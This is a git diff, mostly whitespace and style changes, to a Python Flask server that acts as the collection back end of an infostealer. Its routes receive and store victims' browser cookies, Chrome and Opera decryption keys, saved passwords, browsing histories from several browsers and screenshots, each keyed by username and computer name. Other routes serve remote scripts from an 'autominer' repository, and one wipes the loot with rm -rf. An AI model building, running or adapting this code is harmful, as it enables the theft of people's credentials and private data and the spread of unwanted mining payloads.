@@ -1,8 +1,10 @@
 import flask
 import time
 import json
-import base64,random
-import sqlite3,os
+import base64
+import random
+import sqlite3
+import os
 import requests
 import win32crypt  # type: ignore
 from Cryptodome.Cipher import AES
@@ -10,7 +12,7 @@ from datetime import datetime, timedelta
 from flask import request
 app = flask.Flask(__name__)
 
-password="asdfsdf"
+password = ""
 
 if not os.path.exists("./dbs"):
     os.makedirs("./dbs")
@@ -22,6 +24,7 @@ if not os.path.exists("./screenshots"):
     os.makedirs("./screenshots")
 if not os.path.exists("./Json"):
     os.makedirs("./Json")
+
 
 def chrome_date_and_time(chrome_data):
     # Chrome_data format is 'year-month-date
@@ -128,7 +131,8 @@ def saveCookie():
             f.write(txt)
         # print(txt)
         return "ok"
-    
+
+
 @app.route('/saveOperaCookie', methods=['POST'])
 def saveOperaCookie():
     if request.method == 'POST':
@@ -153,7 +157,7 @@ def saveAesKey():
         data = request.form  # a multidict containing POST data
         key = data['masterKey']
         username = data['username']
-        name=data['name']
+        name = data['name']
         ComputerName = data['ComputerName']
         key = key.split("\n")[0]
         key = base64.b64decode(key)
@@ -163,14 +167,15 @@ def saveAesKey():
             f.write(key)
         # print(txt)
         return "ok"
-    
+
+
 @app.route('/saveOperaAesKey', methods=['POST'])
 def saveOperaAesKey():
     if request.method == 'POST':
         data = request.form  # a multidict containing POST data
         key = data['masterKey']
         username = data['username']
-        name=data['name']
+        name = data['name']
         ComputerName = data['ComputerName']
         key = key.split("\n")[0]
         key = base64.b64decode(key)
@@ -181,6 +186,7 @@ def saveOperaAesKey():
         # print(txt)
         return "ok"
 
+
 @app.route('/saveJson', methods=['POST'])
 def saveJson():
     if request.method == 'POST':
@@ -189,11 +195,12 @@ def saveJson():
         username = data['username']
         ComputerName = data['ComputerName']
         key = base64.b64decode(key)
-        filename = "./Json/"+ \
+        filename = "./Json/" + \
             str(int(time.time()))+"-"+username+"-"+ComputerName
         with open(filename+".json", "wb") as f:
             f.write(key)
         return "ok"
+
 
 @app.route('/saveSavedPasswords', methods=['POST'])
 def saveSavedPasswords():
@@ -217,6 +224,7 @@ def saveSavedPasswords():
             json.dump(password, f)
         return "ok"
 
+
 @app.route('/saveOperaSavedPasswords', methods=['POST'])
 def saveOperaSavedPasswords():
     if request.method == 'POST':
@@ -239,6 +247,7 @@ def saveOperaSavedPasswords():
             json.dump(password, f)
         return "ok"
 
+
 @app.route('/saveSafariHistory', methods=['POST'])
 def saveSafariHistory():
     if request.method == 'POST':
@@ -256,14 +265,15 @@ def saveSafariHistory():
         cur = con.cursor()
         cur = cur.execute("SELECT * FROM history_items;")
         # save as json
-        dat=cur.fetchall()
-        dat=[list(map(str, x)) for x in dat]
+        dat = cur.fetchall()
+        dat = [list(map(str, x)) for x in dat]
         with open("./data/"+filename+".json", "w") as f:
-            json.dump(dat, f,ensure_ascii=False)
+            json.dump(dat, f, ensure_ascii=False)
         cur.close()
         con.close()
         # print(txt)
         return "ok"
+
 
 @app.route('/saveOperaHistory', methods=['POST'])
 def saveOperaHistory():
@@ -313,6 +323,8 @@ def saveFirefoxHistory():
         cur.close()
         con.close()
         return "ok"
+
+
 @app.route('/saveEdgeHistory', methods=['POST'])
 def saveEdgeHistory():
     if request.method == 'POST':
@@ -337,6 +349,7 @@ def saveEdgeHistory():
         con.close()
         return "ok"
 
+
 @app.route('/saveScreenshot', methods=['POST'])
 def saveScreenshot():
     if request.method == 'POST':
@@ -345,17 +358,18 @@ def saveScreenshot():
         username = data['username']
         ComputerName = data['ComputerName']
         key = base64.b64decode(key)
-        filename = "./screenshots/"+ \
+        filename = "./screenshots/" + \
             str(int(time.time()))+"-"+username+"-"+ComputerName
         with open(filename+".png", "wb") as f:
             f.write(key)
         return "ok"
 
+
 @app.route('/clear/<passw>')
 def clear(passw):
-    if password=="":
+    if password == "":
         return "run /getpass"
-    elif passw==password:
+    elif passw == password:
         os.system("rm -rf ./dbs/*")
         os.system("rm -rf ./data/*")
         os.system("rm -rf ./aesKey/*")
@@ -371,25 +385,30 @@ def clear(passw):
             os.makedirs("./screenshots")
         if not os.path.exists("./Json"):
             os.makedirs("./Json")
-        password=""
+        password = ""
         return "ok"
-    elif passw!=password:
-        password=""
+    elif passw != password:
+        password = ""
         return "wrong password"
+
+
 @app.route('/getpass')
 def getpass():
     global password
-    passw=str(random.randint(100000,999999))
-    password=passw
-    print("password:",passw)
+    passw = str(random.randint(100000, 999999))
+    password = passw
+    print("password:", passw)
     return "ok"
+
 
 @app.route('/get')
 def get():
     return requests.get("https://raw.githubusercontent.com/zlc1004/autominer/main/get").text
 
+
 @app.route('/mac')
 def mac():
     return requests.get("https://raw.githubusercontent.com/zlc1004/autominer/main/mac.sh").text
+
 
 app.run(host='0.0.0.0', port="50000")
